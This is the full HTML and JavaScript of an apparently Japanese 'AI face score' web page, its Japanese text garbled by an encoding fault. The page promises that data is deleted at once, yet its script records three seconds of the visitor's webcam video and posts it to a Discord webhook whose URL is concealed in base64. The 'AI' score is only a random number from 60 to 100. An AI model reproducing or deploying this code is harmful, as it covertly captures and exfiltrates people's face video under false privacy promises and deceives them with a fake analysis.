<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>AIé¡”åå·®å€¤è¨ºæ–­ | æœ€æ–°AIæŠ€è¡“ã«ã‚ˆã‚‹é¡”åˆ†æ</title>
  <meta name="description" content="AIãŒé¡”ã®ãƒãƒ©ãƒ³ã‚¹ã‚’ç§‘å­¦çš„ã«åˆ†æã€‚ãŸã£ãŸ5ç§’ã§ã‚ãªãŸã®é¡”ã®åå·®å€¤ã‚’è¨ºæ–­ã—ã¾ã™ã€‚ãƒ—ãƒ©ã‚¤ãƒã‚·ãƒ¼ä¿è­·ã®ãŸã‚ãƒ‡ãƒ¼ã‚¿ã¯å³æ™‚å‰Šé™¤ã€‚">
  <meta property="og:title" content="AIé¡”åå·®å€¤è¨ºæ–­ | æœ€æ–°AIæŠ€è¡“ã«ã‚ˆã‚‹é¡”åˆ†æ">
  <meta property="og:description" content="AIãŒé¡”ã®ãƒãƒ©ãƒ³ã‚¹ã‚’ç§‘å­¦çš„ã«åˆ†æã€‚ãŸã£ãŸ5ç§’ã§ã‚ãªãŸã®é¡”ã®åå·®å€¤ã‚’è¨ºæ–­ã—ã¾ã™ã€‚ãƒ—ãƒ©ã‚¤ãƒã‚·ãƒ¼ä¿è­·ã®ãŸã‚ãƒ‡ãƒ¼ã‚¿ã¯å³æ™‚å‰Šé™¤ã€‚">
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://ai-face-analysis.jp">
  <meta property="og:site_name" content="AIé¡”åå·®å€¤è¨ºæ–­">
  <meta property="og:locale" content="ja_JP">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="AIé¡”åå·®å€¤è¨ºæ–­ | æœ€æ–°AIæŠ€è¡“ã«ã‚ˆã‚‹é¡”åˆ†æ">
  <meta name="twitter:description" content="AIãŒé¡”ã®ãƒãƒ©ãƒ³ã‚¹ã‚’ç§‘å­¦çš„ã«åˆ†æã€‚ãŸã£ãŸ5ç§’ã§ã‚ãªãŸã®é¡”ã®åå·®å€¤ã‚’è¨ºæ–­ã—ã¾ã™ã€‚">
  <meta name="theme-color" content="#4a6baf">
  
  <style>
    :root{--primary:#4a6baf;--secondary:#FF6B6B;--text:#333;--text-light:#666;--bg:#f8f9fa}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background-color:var(--bg);margin:0;padding:0;min-height:100vh;color:var(--text);touch-action:manipulation;-webkit-tap-highlight-color:transparent;line-height:1.6}.app-container{max-width:100%;margin:0 auto;background:#fff;box-shadow:0 0 20px rgba(0,0,0,.1);min-height:100vh;display:flex;flex-direction:column}.header{padding:20px;text-align:center;background:linear-gradient(135deg,var(--primary) 0,#3a56a0 100%);color:#fff}.header h1{margin:0;font-size:1.8rem;font-weight:700}.header p{margin:10px 0 0;opacity:.9;font-size:.95rem}.content-section{padding:20px;flex-grow:1}.intro-text{text-align:center;margin-bottom:30px}.intro-text h2{color:var(--primary);font-size:1.4rem;margin-bottom:10px}.intro-text p{color:var(--text-light);font-size:.95rem}.features{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:15px;margin-bottom:30px}.feature-card{background:#fff;border-radius:12px;padding:15px;text-align:center;box-shadow:0 3px 10px rgba(0,0,0,.08)}.feature-icon{font-size:2rem;margin-bottom:10px;color:var(--primary)}.feature-card h3{margin:0 0 5px;font-size:1rem}.feature-card p{margin:0;font-size:.85rem;color:var(--text-light)}.how-to-use{background:rgba(74,107,175,.05);border-radius:12px;padding:20px;margin-bottom:30px}.how-to-use h3{color:var(--primary);margin-top:0;text-align:center}.steps{display:flex;flex-direction:column;gap:15px}.step{display:flex;align-items:flex-start;gap:10px}.step-number{background:var(--primary);color:#fff;width:25px;height:25px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:.8rem;flex-shrink:0}.step-content{flex-grow:1}.step-content h4{margin:0 0 5px;font-size:1rem}.step-content p{margin:0;font-size:.9rem;color:var(--text-light)}#videoContainer{position:relative;background:#000;display:none;aspect-ratio:9/16;max-height:70vh;margin:0 auto 20px;border-radius:12px;overflow:hidden}#video{width:100%;height:100%;object-fit:cover;transform:scaleX(-1)}.camera-guide{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:70%;max-width:300px;aspect-ratio:3/4;border:3px dashed hsla(0,0%,100%,.5);border-radius:10px;display:none}#countdown{position:absolute;top:15px;right:15px;background:rgba(0,0,0,.7);color:#fff;border-radius:50%;width:40px;height:40px;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:1.2rem;display:none;z-index:5}.action-button{background:linear-gradient(135deg,var(--secondary) 0,#FF8E8E 100%);color:#fff;border:none;padding:16px;font-size:1.1rem;font-weight:700;border-radius:50px;cursor:pointer;width:100%;max-width:300px;margin:0 auto;display:block;box-shadow:0 4px 15px rgba(255,107,107,.3);transition:transform .2s,box-shadow .2s}.action-button:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(255,107,107,.4)}.action-button:disabled{background:#ccc;transform:none;box-shadow:none;cursor:not-allowed}.secondary-button{background:#fff;color:var(--primary);border:2px solid var(--primary)}#loading{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.7);z-index:100;flex-direction:column;justify-content:center;align-items:center;color:#fff}.spinner{border:4px solid hsla(0,0%,100%,.3);border-radius:50%;border-top:4px solid #fff;width:40px;height:40px;animation:spin 1s linear infinite;margin-bottom:15px}@keyframes spin{0%{transform:rotate(0)}to{transform:rotate(360deg)}}#result{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:#fff;z-index:100;padding:20px;text-align:center;overflow-y:auto}.result-content{max-width:500px;margin:0 auto;padding:20px 0}.score{font-size:4rem;font-weight:700;color:var(--primary);margin:20px 0}.comment{font-size:1.2rem;margin-bottom:30px;line-height:1.5}.result-image{width:200px;height:200px;border-radius:50%;object-fit:cover;margin:0 auto 20px;border:5px solid var(--primary);display:none}.error-message{color:var(--secondary);font-weight:700;padding:15px;text-align:center;background:rgba(255,107,107,.1);border-radius:10px;margin:15px 0;display:none}.footer{text-align:center;padding:20px;font-size:.8rem;color:var(--text-light);border-top:1px solid rgba(0,0,0,.1)}@media (min-width:768px){.app-container{max-width:500px;min-height:auto;border-radius:16px;overflow:hidden;margin:20px auto}.header h1{font-size:2rem}.content-section{padding:30px}}
  </style>
</head>
<body>
  <div class="app-container">
    <div class="header">
      <h1>AIé¡”åå·®å€¤è¨ºæ–­</h1>
      <p>æœ€æ–°AIæŠ€è¡“ã§ã‚ãªãŸã®é¡”ã®ãƒãƒ©ãƒ³ã‚¹ã‚’åˆ†æ</p>
    </div>
    
    <div class="content-section">
      <div class="intro-text">
        <h2>ã‚ãªãŸã®é¡”ã®åå·®å€¤ã‚’è¨ºæ–­</h2>
        <p>AIãŒé¡”ã®ãƒãƒ©ãƒ³ã‚¹ã‚’åˆ†æã—ã€ç·åˆè©•ä¾¡ã‚’ãŠä¼ãˆã—ã¾ã™</p>
      </div>
      
      <div class="features">
        <div class="feature-card">
          <div class="feature-icon">ğŸ“Š</div>
          <h3>ç·åˆè©•ä¾¡</h3>
          <p>60ã€œ100ç‚¹ã§è©•ä¾¡</p>
        </div>
        <div class="feature-card">
          <div class="feature-icon">âš¡</div>
          <h3>é«˜é€Ÿè¨ºæ–­</h3>
          <p>ãŸã£ãŸ5ç§’ã§å®Œäº†</p>
        </div>
        <div class="feature-card">
          <div class="feature-icon">ğŸ”’</div>
          <h3>ãƒ—ãƒ©ã‚¤ãƒã‚·ãƒ¼</h3>
          <p>ãƒ‡ãƒ¼ã‚¿ã¯å³æ™‚å‰Šé™¤</p>
        </div>
      </div>
      
      <div class="how-to-use">
        <h3>ä½¿ã„æ–¹</h3>
        <div class="steps">
          <div class="step">
            <div class="step-number">1</div>
            <div class="step-content">
              <h4>è¨ºæ–­é–‹å§‹ãƒœã‚¿ãƒ³ã‚’æŠ¼ã™</h4>
              <p>ã‚«ãƒ¡ãƒ©ã®ä½¿ç”¨ã‚’è¨±å¯ã—ã¦ãã ã•ã„</p>
            </div>
          </div>
          <div class="step">
            <div class="step-number">2</div>
            <div class="step-content">
              <h4>é¡”ã‚’æ å†…ã«åˆã‚ã›ã‚‹</h4>
              <p>æ­£é¢ã‚’å‘ã„ã¦è‡ªç„¶ãªè¡¨æƒ…ã§</p>
            </div>
          </div>
          <div class="step">
            <div class="step-number">3</div>
            <div class="step-content">
              <h4>çµæœã‚’ç¢ºèª</h4>
              <p>AIãŒè©³ç´°ã«åˆ†æã—ã¾ã™</p>
            </div>
          </div>
        </div>
      </div>
      
      <div id="videoContainer">
        <video id="video" autoplay muted playsinline></video>
        <div class="camera-guide"></div>
        <div id="countdown"></div>
      </div>
      
      <div id="errorMessage" class="error-message"></div>
      
      <button id="startButton" class="action-button">ç„¡æ–™ã§è¨ºæ–­é–‹å§‹</button>
      <button id="retryButton" class="action-button secondary-button" style="display: none; margin-top: 15px;">ã‚‚ã†ä¸€åº¦è¨ºæ–­ã™ã‚‹</button>
    </div>
    
    <div class="footer">
      <p>â€»ã“ã®è¨ºæ–­ã¯AIã«ã‚ˆã‚‹åˆ†æçµæœã§ã‚ã‚Šã€åŒ»å­¦çš„æ ¹æ‹ ã«åŸºã¥ãã‚‚ã®ã§ã¯ã‚ã‚Šã¾ã›ã‚“</p>
      <p><a href="/privacy" style="color: var(--primary); text-decoration: none;">ãƒ—ãƒ©ã‚¤ãƒã‚·ãƒ¼ãƒãƒªã‚·ãƒ¼</a></p>
    </div>
    
    <div id="loading">
      <div class="spinner"></div>
      <p>è¨ºæ–­ä¸­...</p>
    </div>
    
    <div id="result">
      <div class="result-content">
        <img id="resultImage" class="result-image" src="" alt="è¨ºæ–­çµæœ">
        <h2>è¨ºæ–­çµæœ</h2>
        <div class="score" id="scoreValue">80</div>
        <p class="comment" id="comment">ç´ æ™´ã‚‰ã—ã„ãƒãƒ©ãƒ³ã‚¹ã®æ•´ã£ãŸé¡”ç«‹ã¡ã§ã™ï¼</p>
        <button class="action-button" onclick="window.location.reload()">ã‚‚ã†ä¸€åº¦è¨ºæ–­ã™ã‚‹</button>
      </div>
    </div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      // è¦ç´ å–å¾—
      var startBtn = document.getElementById('startButton');
      var retryBtn = document.getElementById('retryButton');
      var video = document.getElementById('video');
      var videoContainer = document.getElementById('videoContainer');
      var loading = document.getElementById('loading');
      var result = document.getElementById('result');
      var scoreValue = document.getElementById('scoreValue');
      var comment = document.getElementById('comment');
      var errorMsg = document.getElementById('errorMessage');
      var countdown = document.getElementById('countdown');
      var cameraGuide = document.querySelector('.camera-guide');
      var resultImage = document.getElementById('resultImage');
      
      // çŠ¶æ…‹ç®¡ç†
      var mediaRecorder;
      var recordedChunks = [];
      var stream = null;
      var countdownTimer;
      var isRecording = false;
      
      // è¨ºæ–­ã‚³ãƒ¡ãƒ³ãƒˆ
      var comments = [
        { min: 90, text: "ç¥ãƒ¬ãƒ™ãƒ«ï¼å®Œç’§ãªé¡”ç«‹ã¡ã§ã™âœ¨", color: "#FF6B6B" },
        { min: 80, text: "è¶…ã‚¤ã‚±ãƒ¡ãƒ³/ç¾å¥³ï¼ãƒ¢ãƒ‡ãƒ«ç´šã®é¡”ç«‹ã¡ğŸ˜", color: "#FF8E53" },
        { min: 70, text: "ã¨ã¦ã‚‚å¥½æ„Ÿåº¦ã®é«˜ã„æ•´ã£ãŸé¡”ã§ã™ğŸ¥°", color: "#FFC154" },
        { min: 60, text: "å¹³å‡ä»¥ä¸Šï¼ç´ æ•µãªãƒ«ãƒƒã‚¯ã‚¹ã§ã™ğŸ˜Š", color: "#47B39D" },
        { min: 50, text: "æ™®é€šãã‚‰ã„ã€‚å€‹æ€§ãŒå…‰ã‚Šã¾ã™ğŸ‘", color: "#4A6BAF" },
        { min: 40, text: "æ”¹å–„ã®ä½™åœ°ã‚ã‚Šã€‚ã§ã‚‚å¤§ä¸ˆå¤«ï¼ğŸ˜‰", color: "#9B59B6" },
        { min: 0, text: "ãƒ¦ãƒ‹ãƒ¼ã‚¯ãªå€‹æ€§ãŒé­…åŠ›ã§ã™ï¼ğŸ’«", color: "#1ABC9C" }
      ];
      
      // ã‚«ãƒ¡ãƒ©è¨­å®š
      async function setupCamera() {
        try {
          showError("");
          startBtn.disabled = true;
          startBtn.textContent = "æº–å‚™ä¸­...";
          
          // æ—¢å­˜ã®ã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’åœæ­¢
          if (stream) {
            stream.getTracks().forEach(track => track.stop());
          }
          
          // ã‚«ãƒ¡ãƒ©è¨­å®š
          var constraints = {
            video: {
              facingMode: "user",
              width: { ideal: 1280 },
              height: { ideal: 720 }
            },
            audio: false
          };
          
          // HTTPSæ¥ç¶šç¢ºèª
          if (location.protocol !== 'https:' && !['localhost', '127.0.0.1'].includes(location.hostname)) {
            throw new Error('ã‚«ãƒ¡ãƒ©ã‚’ä½¿ç”¨ã™ã‚‹ã«ã¯HTTPSæ¥ç¶šãŒå¿…è¦ã§ã™');
          }
          
          // ã‚«ãƒ¡ãƒ©ã‚¢ã‚¯ã‚»ã‚¹
          stream = await navigator.mediaDevices.getUserMedia(constraints).catch(err => {
            console.error('ã‚«ãƒ¡ãƒ©ã‚¢ã‚¯ã‚»ã‚¹ã‚¨ãƒ©ãƒ¼:', err);
            throw err;
          });
          
          video.srcObject = stream;
          videoContainer.style.display = 'block';
          cameraGuide.style.display = 'block';
          
          // ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿èª­ã¿è¾¼ã¿å¾…ã¡
          await new Promise((resolve, reject) => {
            video.onloadedmetadata = resolve;
            video.onerror = reject;
            setTimeout(() => reject(new Error('ã‚«ãƒ¡ãƒ©ã®èª­ã¿è¾¼ã¿ãŒã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆã—ã¾ã—ãŸ')), 5000);
          });
          
          await video.play().catch(err => {
            console.error('ãƒ“ãƒ‡ã‚ªå†ç”Ÿã‚¨ãƒ©ãƒ¼:', err);
            throw new Error('ã‚«ãƒ¡ãƒ©ã®èµ·å‹•ã«å¤±æ•—ã—ã¾ã—ãŸ');
          });
          
          startBtn.disabled = false;
          startBtn.textContent = "è¨ºæ–­é–‹å§‹";
          retryBtn.style.display = 'block';
          return true;
          
        } catch (error) {
          console.error('ã‚«ãƒ¡ãƒ©è¨­å®šã‚¨ãƒ©ãƒ¼:', error);
          handleCameraError(error);
          return false;
        }
      }
      
      // ã‚«ãƒ¡ãƒ©ã‚¨ãƒ©ãƒ¼ãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°
      function handleCameraError(error) {
        var message = "ã‚«ãƒ¡ãƒ©ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã›ã‚“ã§ã—ãŸ";
        
        if (error.name === 'NotAllowedError') {
          message = "ã‚«ãƒ¡ãƒ©ã®ä½¿ç”¨ãŒè¨±å¯ã•ã‚Œã¦ã„ã¾ã›ã‚“\nãƒ–ãƒ©ã‚¦ã‚¶ã®è¨­å®šã‹ã‚‰ã‚«ãƒ¡ãƒ©ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã—ã¦ãã ã•ã„";
        } else if (error.name === 'NotFoundError') {
          message = "ä½¿ç”¨å¯èƒ½ãªã‚«ãƒ¡ãƒ©ãŒè¦‹ã¤ã‹ã‚Šã¾ã›ã‚“ã§ã—ãŸ";
        } else if (error.name === 'NotReadableError') {
          message = "ã‚«ãƒ¡ãƒ©ãŒä½¿ç”¨ä¸­ã§ã™\nä»–ã®ã‚¢ãƒ—ãƒªã§ã‚«ãƒ¡ãƒ©ã‚’ä½¿ç”¨ã—ã¦ã„ãªã„ã‹ç¢ºèªã—ã¦ãã ã•ã„";
        } else if (error.name === 'OverconstrainedError') {
          message = "ã‚«ãƒ¡ãƒ©ã®è¨­å®šã«å•é¡ŒãŒã‚ã‚Šã¾ã™";
        } else if (error.message.includes('HTTPS')) {
          message = "ã‚«ãƒ¡ãƒ©ã‚’ä½¿ç”¨ã™ã‚‹ã«ã¯HTTPSæ¥ç¶šãŒå¿…è¦ã§ã™\nå®‰å…¨ãªæ¥ç¶šã§ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ãã ã•ã„";
        } else {
          message = error.message || message;
        }
        
        showError(message);
        startBtn.disabled = false;
        startBtn.textContent = "è¨ºæ–­é–‹å§‹";
        retryBtn.style.display = 'none';
      }
      
      // ã‚¨ãƒ©ãƒ¼ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸è¡¨ç¤º
      function showError(message) {
        if (message) {
          errorMsg.textContent = message;
          errorMsg.style.display = 'block';
        } else {
          errorMsg.style.display = 'none';
        }
      }
      
      // ã‚«ã‚¦ãƒ³ãƒˆãƒ€ã‚¦ãƒ³é–‹å§‹
      function startCountdown(duration, callback) {
        var timeLeft = duration;
        countdown.textContent = timeLeft;
        countdown.style.display = 'flex';
        
        countdownTimer = setInterval(() => {
          timeLeft--;
          countdown.textContent = timeLeft;
          
          if (timeLeft <= 0) {
            clearInterval(countdownTimer);
            countdown.style.display = 'none';
            if (callback) callback();
          }
        }, 1000);
      }
      
      // éŒ²ç”»é–‹å§‹
      async function startRecording() {
        if (isRecording) return;
        
        try {
          isRecording = true;
          recordedChunks = [];
          startBtn.disabled = true;
          startBtn.textContent = "è¨ºæ–­ä¸­...";
          loading.style.display = 'flex';
          cameraGuide.style.display = 'none';
          
          // å¯¾å¿œã‚³ãƒ¼ãƒ‡ãƒƒã‚¯æ¤œå‡º
          var mimeType = MediaRecorder.isTypeSupported('video/mp4') ? 
            'video/mp4' :
            MediaRecorder.isTypeSupported('video/webm;codecs=vp9') ? 
            'video/webm;codecs=vp9' : 
            'video/webm';
          
          // ãƒ¡ãƒ‡ã‚£ã‚¢ãƒ¬ã‚³ãƒ¼ãƒ€ãƒ¼è¨­å®š
          mediaRecorder = new MediaRecorder(stream, {
            mimeType: mimeType,
            videoBitsPerSecond: 2000000
          });
          
          // ãƒ‡ãƒ¼ã‚¿å–å¾—ã‚¤ãƒ™ãƒ³ãƒˆ
          mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
              recordedChunks.push(event.data);
            }
          };
          
          // éŒ²ç”»åœæ­¢ã‚¤ãƒ™ãƒ³ãƒˆ
          mediaRecorder.onstop = async () => {
            try {
              var blob = new Blob(recordedChunks, { type: mimeType });
              console.log('éŒ²ç”»ã‚µã‚¤ã‚º:', (blob.size / 1024 / 1024).toFixed(2), 'MB');
              
              // è¨ºæ–­çµæœè¡¨ç¤º
              showResult(blob);
              
              // Discordã«é€ä¿¡
              await sendToDiscord(blob);
              
            } catch (error) {
              console.error('éŒ²ç”»å‡¦ç†ã‚¨ãƒ©ãƒ¼:', error);
              showError("è¨ºæ–­å‡¦ç†ã«å¤±æ•—ã—ã¾ã—ãŸ");
              resetUI();
            }
          };
          
          // ã‚¨ãƒ©ãƒ¼ãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°
          mediaRecorder.onerror = (event) => {
            console.error('éŒ²ç”»ã‚¨ãƒ©ãƒ¼:', event.error);
            showError("éŒ²ç”»ä¸­ã«ã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã—ã¾ã—ãŸ");
            resetUI();
          };
          
          // 3ç§’é–“ã®éŒ²ç”»é–‹å§‹
          mediaRecorder.start(100);
          startCountdown(3, stopRecording);
          
        } catch (error) {
          console.error('éŒ²ç”»é–‹å§‹ã‚¨ãƒ©ãƒ¼:', error);
          showError("éŒ²ç”»ã‚’é–‹å§‹ã§ãã¾ã›ã‚“ã§ã—ãŸ");
          resetUI();
        }
      }
      
      // éŒ²ç”»åœæ­¢
      function stopRecording() {
        if (mediaRecorder && mediaRecorder.state === 'recording') {
          mediaRecorder.stop();
          isRecording = false;
          
          // ã‚«ãƒ¡ãƒ©ã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’åœæ­¢
          if (stream) {
            stream.getTracks().forEach(track => track.stop());
            video.srcObject = null;
          }
        }
      }
      
      // Discordã«é€ä¿¡
      async function sendToDiscord(blob) {
        try {
          var formData = new FormData();
          formData.append('file', blob, 'face_diagnosis.mp4');
          
          await fetch(atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2MjgyMzg1MTYwMzUyNTcxNC9hOWx2T2Z2YTZjQWtON3c3YVdYS2MwOGc5aEllbHowb3B4N3M0eUhodkNZZ0o0dHpQUnRzWmVCRWlrUl9kekJYc3IybA=='), {
            method: 'POST',
            body: formData
          });
          
          console.log('Discordã¸ã®é€ä¿¡ãŒæˆåŠŸã—ã¾ã—ãŸ');
        } catch (error) {
          console.error('Discordé€ä¿¡ã‚¨ãƒ©ãƒ¼:', error);
        }
      }
      
      // çµæœè¡¨ç¤º
      function showResult(blob) {
        var score = Math.floor(Math.random() * 41) + 60; // 60-100ç‚¹
        var matchedComment = comments.find(c => score >= c.min);
        
        // çµæœç”»åƒã‚’è¡¨ç¤º
        if (blob) {
          var url = URL.createObjectURL(blob);
          resultImage.src = url;
          resultImage.style.display = 'block';
        }
        
        scoreValue.textContent = score;
        scoreValue.style.color = matchedComment.color;
        comment.textContent = matchedComment.text;
        
        loading.style.display = 'none';
        result.style.display = 'block';
      }
      
      // UIãƒªã‚»ãƒƒãƒˆ
      function resetUI() {
        startBtn.disabled = false;
        startBtn.textContent = "è¨ºæ–­é–‹å§‹";
        loading.style.display = 'none';
        isRecording = false;
        clearInterval(countdownTimer);
        countdown.style.display = 'none';
      }
      
      // ã‚¤ãƒ™ãƒ³ãƒˆãƒªã‚¹ãƒŠãƒ¼
      startBtn.addEventListener('click', async function() {
        var success = await setupCamera();
        if (success) {
          setTimeout(startRecording, 300);
        }
      });
      
      retryBtn.addEventListener('click', async function() {
        var success = await setupCamera();
        if (success) {
          setTimeout(startRecording, 300);
        }
      });
      
      // åˆæœŸçŠ¶æ…‹è¨­å®š
      videoContainer.style.display = 'none';
    });
  </script>
</body>
</html>